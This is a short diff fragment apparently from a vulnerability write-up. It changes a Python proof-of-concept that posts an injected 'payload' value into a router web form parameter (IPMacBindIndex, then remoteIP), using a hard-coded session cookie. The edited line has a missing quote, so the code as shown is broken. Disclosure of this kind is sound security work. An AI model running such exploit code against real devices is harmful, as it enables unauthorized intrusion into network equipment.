@@ -28,7 +28,7 @@ header={
 'Referer':'http://192.168.100.2/mac_filter.html?random=0.008005922687726486&',
 'Cookie':'password=17399d7fb9cf0644a1f50f015116919dcabazx'} 
 
-data1 ='IPMacBindIndex=%s'%payload
+data1 =enable=true&remotetype=test&remoteWan=0000&remotePort=1000&remoteIP=%s'%payload
 ret = requests.post(url = url ,headers = header,data = data1, verify=False)
 ```
 The exploitation is as shown
